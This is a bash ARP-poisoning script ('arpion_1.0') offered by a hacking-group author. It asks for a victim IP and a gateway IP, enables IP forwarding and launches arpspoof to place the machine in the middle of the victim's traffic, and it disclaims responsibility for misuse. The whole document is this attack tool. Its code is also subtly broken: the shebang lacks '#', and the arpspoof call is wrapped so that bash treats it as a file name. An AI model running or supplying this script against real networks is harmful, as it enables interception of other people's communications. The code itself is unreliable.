!/bin/bash
#####################################################################################################################
#                                                                                                               	#
#                 	This script is written by Johan aka Saint, admin of Webbh4tt                              	#
#  This program is open source; you can redistribute it and/or modify it under the terms of the GNU General Public  #
#             	The author bears no responsibility  for malicious or illegal use.                             	#
#                                                                                                               	#
#                                                                                                               	#
#####################################################################################################################

##########################################################################################
#                                	known bugs                                      	#
#                                	None so far                                     	#
#                	Please report bugs to info@webbhatt.com                         	#
##########################################################################################

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
	NORMAL=`echo "\033[m"`
		BLUE=`echo "\033[36m"` #Blue
			NUMBER=`echo "\033[33m"` #yellow
				FGRED=`echo "\033[41m"`
					RED_TEXT=`echo "\033[31m"` #Red
						ENTER_LINE=`echo "\033[33m"`
							INTRO_TEXT=`echo "\033[32m"` #green and white text
								INFOS=`echo "\033[103;30m"` #yellow bg
									SUCCESS=`echo "\033[102;30m"` #green bg
										WARNING=`echo "\033[101;30m"` #red bg
											WARP=`echo "\033[106;30m"` #lightblue bg
												BLACK=`echo "\033[109;30m"` #SPACE bg
													END=`echo "\033[0m"`
													# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
													#info
													ver=$(echo arpion_1.0)
													#Author Johan "Saint" Börjesson

													#################################Start script and validation####################################

													niccard=eth0
													if [[ $EUID -ne 0 ]]; then
													echo -e "${RED_TEXT}Script must be run as root!${END}"
													exit 1
													else
													echo -e "${RED_TEXT}#######################################${END}"
													echo -e "${RED_TEXT}########${END}${BLUE} ARP Poison Script${END}${RED_TEXT} ############${END}"
													echo -e "${RED_TEXT}#######################################${END}"
													echo -e "${BLUE}Author: Webbhatt${END}"
													echo -e "${BLUE}Website:http://www.webbhatt.com${END}"
													echo -n "Please enter target's IP: "
													read victimIP
													echo -n "Please enter Gateway's IP: "
													read gatewayIP
													echo -e "--==[Targets]==--"
													echo -e "${RED_TEXT}Target:${END} $victimIP"
													echo -e "${RED_TEXT}Gateway:${END} $gatewayIP"
													echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
													echo "1" > /proc/sys/net/ipv4/ip_forward
													echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
													bash "arpspoof -i $niccard -t $victimIP $gatewayIP" &
													fi



